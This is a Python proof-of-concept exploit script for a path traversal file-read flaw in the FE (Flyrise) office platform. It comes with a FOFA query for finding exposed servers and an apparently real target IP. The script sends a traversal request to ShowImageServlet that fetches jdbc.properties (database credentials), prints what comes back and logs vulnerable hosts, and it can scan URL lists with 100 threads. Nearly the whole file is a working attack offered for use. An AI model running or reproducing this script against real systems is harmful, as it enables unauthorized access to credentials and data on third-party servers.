# -*- coding:utf-8 -*-
import argparse, sys, base64, requests
import re
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


# fofa：body="flyrise.stopBackspace.js"
# 案例：http://119.188.182.109:8899

def banner():
    content = '''


███████╗███████╗██████╗ ███████╗██████╗  ██████╗  ██████╗
██╔════╝██╔════╝██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔════╝
█████╗  █████╗  ██████╔╝█████╗  ██████╔╝██║   ██║██║     
██╔══╝  ██╔══╝  ██╔══██╗██╔══╝  ██╔═══╝ ██║   ██║██║     
██║     ███████╗██║  ██║██║     ██║     ╚██████╔╝╚██████╗
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝      ╚═════╝  ╚═════╝
                                                         


    '''
    print(content)


def poc(target):
    url = target + '/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Cookie': "JSESSIONID=E3124D1BAE48FBD3B8048E60341A9418",
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    try:
        res = requests.post(url, headers=headers, verify=False, timeout=5).text
        if 'ip' in res:
            print(f'[+]{target}存在文件读取漏洞')
            print(res)
            with open('result.txt', 'a+', encoding='utf-8') as f:
                f.write(target + '\n')
        else:
            print(f'[-]{target}不存在文件读取漏洞')
    except:
        print(f'[-]{target}无法进入')

def main():
    banner()
    parser = argparse.ArgumentParser(description='FE参数文件读取漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='example:http://example.com')
    parser.add_argument('-f', '--file', dest='file', type=str, help='url.txt')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
            mp = Pool(100)
            mp.map(poc, url_list)
            mp.close()
            mp.join()
    else:
        print(f'Usage:\n\tpython3 {sys.argv[0]} -h')


if __name__ == '__main__':
    main()